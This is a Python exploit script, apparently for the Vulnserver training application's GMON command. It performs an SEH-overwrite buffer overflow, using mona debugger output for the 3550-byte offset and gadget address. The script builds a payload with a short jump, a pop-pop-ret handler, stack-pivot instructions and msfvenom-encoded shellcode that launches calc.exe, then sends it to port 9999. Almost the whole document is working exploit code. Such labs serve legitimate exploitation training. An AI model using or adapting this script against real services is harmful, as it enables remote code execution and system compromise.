#!/usr/bin/python3
from pwn import remote, p32, asm

prefix = b"GMON /"

"""
[+] Command used:
!py mona exchain
Nr of SEH records : 1
Start of chain (TEB FS:[0]) : 0x0109ffcc
Address     Next SEH    Handler
-------     --------    -------
0x0109ffcc  0x6f45336f  0x356f4534  (record smashed at offset 3550)

[+] Command used:
!py mona seh -m essfunc.dll
[+] Results :
0x625010b4 |   0x625010b4 : pop ebx # pop ebp # ret  |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)
"""

nseh = asm("jmp $+8").ljust(4, b"A")
seh = p32(0x625010b4)

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00' -e x86/jmp_call_additive
shellcode =  b""
shellcode += b"\xfc\xbb\xf7\xf0\xa1\x90\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x0b\x18\x23\x90\xf3\xd9\x44\x18"
shellcode += b"\x16\xe8\x44\x7e\x53\x5b\x75\xf4\x31\x50\xfe"
shellcode += b"\x58\xa1\xe3\x72\x75\xc6\x44\x38\xa3\xe9\x55"
shellcode += b"\x11\x97\x68\xd6\x68\xc4\x4a\xe7\xa2\x19\x8b"
shellcode += b"\x20\xde\xd0\xd9\xf9\x94\x47\xcd\x8e\xe1\x5b"
shellcode += b"\x66\xdc\xe4\xdb\x9b\x95\x07\xcd\x0a\xad\x51"
shellcode += b"\xcd\xad\x62\xea\x44\xb5\x67\xd7\x1f\x4e\x53"
shellcode += b"\xa3\xa1\x86\xad\x4c\x0d\xe7\x01\xbf\x4f\x20"
shellcode += b"\xa5\x20\x3a\x58\xd5\xdd\x3d\x9f\xa7\x39\xcb"
shellcode += b"\x3b\x0f\xc9\x6b\xe7\xb1\x1e\xed\x6c\xbd\xeb"
shellcode += b"\x79\x2a\xa2\xea\xae\x41\xde\x67\x51\x85\x56"
shellcode += b"\x33\x76\x01\x32\xe7\x17\x10\x9e\x46\x27\x42"
shellcode += b"\x41\x36\x8d\x09\x6c\x23\xbc\x50\xfb\xb2\x32"
shellcode += b"\xef\x49\xb4\x4c\xef\xfd\xdd\x7d\x64\x92\x9a"
shellcode += b"\x81\xaf\xd6\x55\xc8\xed\x7f\xfe\x95\x64\xc2"
shellcode += b"\x63\x26\x53\x01\x9a\xa5\x51\xfa\x59\xb5\x10"
shellcode += b"\xff\x26\x71\xc9\x8d\x37\x14\xed\x22\x37\x3d"
shellcode += b"\x8e\xa5\xab\xdd\x7e\x43\x4c\x47\x7e\x8b\xac"
shellcode += b"\x87\x7e\x8b\xac\x87"

offset = 3550
junk = b"A" * (offset - len(shellcode))

payload  = b""
payload += prefix
payload += shellcode
payload += junk
payload += nseh + seh
payload += asm("add sp, 0x5c2")
payload += asm("jmp esp")
payload += asm("nop")
payload += b"B" * (5000 - len(payload))

shell = remote("Windows", 9999)
shell.sendline(payload)
